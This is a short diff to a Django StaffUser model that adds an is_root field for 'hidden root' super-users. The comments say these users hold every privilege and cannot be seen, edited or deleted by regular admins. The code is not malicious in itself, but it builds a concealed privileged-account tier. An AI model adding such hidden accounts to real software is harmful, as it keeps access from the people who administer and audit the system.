@@ -49,6 +49,14 @@ class StaffUser(AbstractBaseUser, PermissionsMixin):
 
     is_active = models.BooleanField(default=True)
     is_staff = models.BooleanField(default=False)
+    # Hidden 'root' super-user — not visible to regular admins in any listing.
+    # Root has all privileges (implies is_superuser + is_staff), and can see
+    # everything including other root accounts. Regular admins cannot see,
+    # edit, or delete root accounts.
+    is_root = models.BooleanField(
+        default=False,
+        help_text='Hidden root user — invisible to regular admins'
+    )
     date_joined = models.DateTimeField(default=timezone.now)
     last_face_login = models.DateTimeField(null=True, blank=True)
     kiosk_pin = models.CharField(
